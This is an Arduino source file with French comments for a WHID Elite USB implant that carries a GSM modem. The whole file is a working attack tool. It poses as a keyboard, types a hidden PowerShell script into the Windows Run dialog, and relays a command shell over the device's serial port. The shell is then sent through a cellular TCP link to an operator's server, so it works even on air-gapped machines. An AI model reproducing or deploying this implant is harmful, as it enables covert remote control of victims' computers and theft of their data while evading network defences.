#include <Keyboard.h>//bibliothèque permettant d'écrire su l'ordinateur cible an tant que clavier

#include "Adafruit_FONA.h" //Bibliothèque du fona 
#define FONA_RST 4

HardwareSerial *fonaSerial = &Serial1; //Le fona est branché sur les pins 0 et 1, soit le port série 1
Adafruit_FONA fona = Adafruit_FONA(FONA_RST);

void typeKey(uint8_t key) { //fonction d'appui sur une touche 
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}



void setup()
{ 
  Keyboard.begin();
  //char fonaNotificationBuffer[64];
  //char smsBuffer[150];
  Serial.begin(230400);// initialisation des liaison séries (liaison de debug) 
  SerialUSB.begin (230400); // initialisation de la liaison avec l'ordinateur
  fonaSerial->begin(115200);//Initialisationde la liaison avec le FONA 
  if (! fona.begin(*fonaSerial)) { // début de la communication avec le FONA
    Serial.println(F("NO SIM800!"));
    while (1);
  }
  while(true){
    int i = fona.getNumSMS(); //recupération du nombre de SMS
    Serial.print(F("Number of SMS: "));
    Serial.println(i);
    if(i != -1){
      Serial.println(F("\n\rDeleting SMS...")); 
      delay(500);
      if(fona.sendCheckReply(F("AT+CMGDA=\"DEL ALL\"\r\n"), F("OK"), 100)){ //effacement des sms en mémoire 
        break;
      }
    }
    if(i==0) break;
    delay(500);
  }
    Serial.println(F("WHID Elite 1.3.1 is OK")); 
  fona.sendCheckReply(F("AT+CIPMODE=1"),F("OK"),100);

  fona.setGPRSNetworkSettings(F("orange"), F("orange"), F("orange"));//configuration de l'APN (nom, utilisateur, mot de passe)
         
  if (!fona.enableGPRS(true)) //activation du GPRS
    Serial.println(F("Failed to turn on"));
 fona.sendCheckReply(F("AT+CGATT?"),F("OK"),100);// vérification de l'état du GPRS
  
 fona.sendCheckReply(F("AT+CIICR"),F("OK"),100);// 

 fona.sendCheckReply(F("AT+CIFSR"),F("OK"),100);// récupération de l'adresse ip locale de la carte
 
 delay(100);
 //####################################################### ENTER YOUR IP ADDRESS AND ITS PORT HERE!###################################
 //#                                                                                                                                 #
 //###################################################################################################################################
 if(!fona.sendCheckReply("AT+CIPSTART=\"TCP\",\"<IP>\",\"<PORT>\"",F("OK"),100))// connection au Serveur distant 
    while(1);
 //fona.sendCheckReply(F("AT+IFC=2,2"),F("OK"),100); 

 Keyboard.press(KEY_LEFT_GUI);
   delay(50);
   Keyboard.press((char) 114); //In Decimal, is r
   Keyboard.releaseAll();
   delay(1000);
   Keyboard.print("powershell"); // ouverture powershell 
   typeKey(KEY_RETURN);
   delay(1000);
   //camoufl(); //payload voir annexe 
    Keyboard.print("$pt = New-Object -TypeName System.Diagnostics.Process;$it = $pt.StartInfo;$it.CreateNoWindow = $true;$it.UseShellExecute = $false;$it.RedirectStandardInput = $true;$it.RedirectStandardOutput = $true;$it.RedirectStandardError = $true;$it.FileName = \"powershell.exe\";$null = $pt.Start();$ct=$pt.StandardInput;$st=$pt.StandardOutput;"); 
   Keyboard.print(F("$ct.WriteLine(\" `$c=(gwmi Win32_SerialPort|Where-Object{`$_.PNPDeviceID -match `\"ID_2341&PID_804D`\"}).DeviceID;"));
   Keyboard.print(F("`$po=new-Object System.IO.Ports.SerialPort `$c,230400,None,8,one;`$po.open();"));
   //typeKey(KEY_RETURN);
  Keyboard.print("`$p = New-Object -TypeName System.Diagnostics.Process;`$i = `$p.StartInfo;`$i.CreateNoWindow = `$true;`$i.UseShellExecute = `$false;`$i.RedirectStandardInput = `$true;`$i.RedirectStandardOutput = `$true;`$i.RedirectStandardError = `$true;`$i.FileName = `\"powershell.exe`\";`$null = `$p.Start();`$c=`$p.StandardInput;`$s=`$p.StandardOutput;"); 
  Keyboard.print("while(1){do {`$de=[char]`$s.Read();`$po.Write(`$de);} while (`$de -ne `\">`\");`$c.WriteLine(`$po.ReadLine())}\") ");
  typeKey(KEY_RETURN);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
 fonaSerial->readString();
  
}

void loop()
{
  if (fonaSerial->available()) //si données dispo sur liaison fona/carte
   {
    
    Serial.print("reçu");
    delay( 1000);  
    String d=fonaSerial->readStringUntil('\n'); // lecture des données 
    Serial.print(d);
    char v[d.length()];// conversion de string en char[]
    strcpy(v, d.c_str());
    SerialUSB.write(v); // ecriture des données sur la liaison série de l'ordinateur 
    SerialUSB.write("\n");
    

 
   }
   
   if (SerialUSB.available()) // si données dispo sur liaison Carte/ordinateur 
   {
    
    
    String BypassAirGap = SerialUSB.readStringUntil('\n'); // lecture des données proventant de l'ordinateur cible // accélération possible 
    Serial.print(BypassAirGap);// affichage de =s données lues (debug)
    char p[BypassAirGap.length()];// conversion de string en char[]
    strcpy(p, BypassAirGap.c_str());
    //fonaSerial->write("AT+CIPSEND");
    delay (500);
    //fona.sendCheckReply(F("AT+CIPSEND"),F(">"),100);//envoi de la commande d'envoi et attente de la reponse du fona
    //indiquant qu'elle est prête 
    fonaSerial->write(p);// transmission des données vers le FONA 
    fonaSerial->write("\n");
    //fonaSerial->write(0x1a);//envoi des données 
    delay (100);
    //Serial.print(fonaSerial->readString());//attente du "send ok"


   }
}
